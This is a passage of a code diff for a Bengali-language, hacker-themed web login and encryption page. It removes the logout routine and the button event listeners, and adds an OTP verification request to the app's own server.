-            sendTelegramNotification(`🚪 <b>লগআউট নোটিফিকেশন!</b>\n👤 ইউজার: <b>${currentUser}</b>\n⏱️ মোট সময়: <b>${duration}</b>`);
+            msgDiv.style.color = "blue";
+            msgDiv.innerText = "ভেরিফাই হচ্ছে...";
 
-            currentUser = null;
-            currentPassword = null;
-            userHistory = [];
-            encryptionMapping = {};
-            loginTime = null;
-
-            document.getElementById('matrixCanvas').style.display = 'none';
-            document.getElementById('asciiCanvas').style.display = 'block';
-            initPythonAsciiRain();
-
-            document.getElementById('dashboardScreen').style.display = 'none';
-            document.getElementById('loginScreen').style.display = 'block';
-            document.getElementById('usernameInput').value = "";
-            document.getElementById('passwordInput').value = "";
-            document.getElementById('securityLevelSelect').value = "1";
-            applySecurityLevelTheme(1);
-        }
-
-        // সব বাটনের কার্যকারিতা নিশ্চিত করতে ইভেন্ট লিসেনার সেটআপ
-        window.addEventListener('DOMContentLoaded', () => {
-            initPythonAsciiRain();
-            applySecurityLevelTheme(1);
-
-            const togglePassword = document.querySelector('#togglePassword');
-            const passwordInput = document.querySelector('#passwordInput');
-            if (togglePassword && passwordInput) {
-                togglePassword.addEventListener('click', function () {
-                    const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
-                    passwordInput.setAttribute('type', type);
-                    this.classList.toggle('fa-eye');
-                    this.classList.toggle('fa-eye-slash');
-                });
-            }
-
-            // ১. কোণায় থাকা মোবাইল/ডেস্কটপ সুইচ বাটন
-            const cornerDeviceBtn = document.getElementById('cornerDeviceBtn');
-            const mainContainer = document.getElementById('mainContainer');
-            const deviceIcon = document.getElementById('deviceIcon');
-            const deviceText = document.getElementById('deviceText');
-
-            if (cornerDeviceBtn) {
-                cornerDeviceBtn.addEventListener('click', () => {
-                    mainContainer.classList.toggle('mobile-mode');
-                    const isMobile = mainContainer.classList.contains('mobile-mode');
-                    if (isMobile) {
-                        deviceIcon.className = "fa-solid fa-desktop";
-                        deviceText.innerText = "ডেস্কটপ মোড";
-                    } else {
-                        deviceIcon.className = "fa-solid fa-mobile-screen-button";
-                        deviceText.innerText = "মোবাইল মোড";
-                    }
-                });
-            }
-
-            // ২. লগইন বাটন
-            const loginButton = document.getElementById('loginButton');
-            if (loginButton) {
-                loginButton.addEventListener('click', triggerHackerLoadingAndLogin);
-            }
-
-            // ৩. লগআউট বাটন
-            const logoutButton = document.getElementById('logoutButton');
-            if (logoutButton) {
-                logoutButton.addEventListener('click', executeUserLogout);
-            }
-            
-            // ৪. ইনক্রিপ্ট বাটন
-            const encryptBtn = document.getElementById('encryptBtn');
-            if (encryptBtn) {
-                encryptBtn.addEventListener('click', () => triggerCryptoLoading('encrypt'));
-            }
-
-            // ৫. ডিক্রিপ্ট বাটন
-            const decryptBtn = document.getElementById('decryptBtn');
-            if (decryptBtn) {
-                decryptBtn.addEventListener('click', () => triggerCryptoLoading('decrypt'));
-            }
-            
-            // ৬. সিকিউরিটি লেভেল ড্রপডাউন পরিবর্তন
-            const securityLevelSelect = document.getElementById('securityLevelSelect');
-            if (securityLevelSelect) {
-                securityLevelSelect.addEventListener('change', function() {
-                    applySecurityLevelTheme(this.value);
-                });
-            }
-
-            // ৭. মেইন কপি বাটন
-            const mainCopyBtn = document.getElementById('mainCopyBtn');
-            if (mainCopyBtn) {
-                mainCopyBtn.addEventListener('click', function() {
-                    copyTextToClipboard(document.getElementById('outputResult').innerText, this);
-                });
-            }
-
-            // ৮. ড্যাশবোর্ডের মোবাইল ভিউ টগল বাটন
-            const mobileToggleBtn = document.getElementById('mobileToggleBtn');
-            if (mobileToggleBtn) {
-                mobileToggleBtn.addEventListener('click', () => {
-                    mainContainer.classList.toggle('mobile-mode');
-                    mobileToggleBtn.innerText = mainContainer.classList.contains('mobile-mode') ? "💻 ডেস্কটপ ভিউ" : "📱 মোবাইল ভিউ";
-                });
-            }
-
-            // এন্টার প্রেস করলে লগইন করার শর্টকাট
-            document.addEventListener('keydown', (event) => {
-                if (event.key === 'Enter') {
-                    const loginScreen = document.getElementById('loginScreen');
-                    if (loginScreen && loginScreen.style.display !== 'none') {
-                        triggerHackerLoadingAndLogin();
-                    }
+            fetch('/verify-otp', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username: currentUsername, otp: otpInput })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    msgDiv.style.color = "green";
+                    msgDiv.innerText = data.message;
+                    setTimeout(() => {
+                        alert("স্বাগতম! আপনি সফলভাবে লগইন করেছেন।");
+                        location.reload();
+                    }, 1000);
+                } else {
+                    msgDiv.style.color = "red";
+                    msgDiv.innerText = data.message;
                 }
+            })
+            .catch(error => {
+                msgDiv.style.color = "red";
+                msgDiv.innerText = "সার্ভার এরর!";
+                console.error('Error:', error);
             });
-        });
+        }
     </script>
 </body>
 </html>
